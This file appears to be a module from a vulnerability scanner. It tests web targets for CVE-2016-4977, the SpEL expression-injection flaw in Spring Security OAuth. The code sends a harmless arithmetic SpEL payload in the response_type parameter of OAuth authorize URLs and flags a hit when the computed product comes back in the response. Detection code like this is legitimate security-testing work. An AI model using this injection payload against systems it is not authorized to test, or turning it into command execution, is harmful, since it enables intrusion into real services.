#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_int_2

cve_2016_4977_payloads = [
    {'path': 'oauth/authorize?response_type={RCECOMMAND}&client_id=acme&scope=openid&redirect_uri=http://test'},
    {'path': 'authorize?response_type={RCECOMMAND}&client_id=acme&scope=openid&redirect_uri=http://test'},
]

def cve_2016_4977_scan(self, clients):
    ''' Spring Security OAuth是为Spring框架提供安全认证支持的一个模块;
        在其使用whitelabel views来处理错误时, 由于使用了Springs Expression Language (SpEL), 
            攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CVE-2016-4977',
    }

    for payload in cve_2016_4977_payloads:
        randomNum_1, randomNum_2 = random_int_2()
        RCEcommand = '${' + str(randomNum_1) + '*' + str(randomNum_2) + '}'
        
        path = payload['path'].format(RCECOMMAND=RCEcommand)

        res = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue
        
        randomNum_sum = str(randomNum_1 * randomNum_2)

        if (randomNum_sum in res.text):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
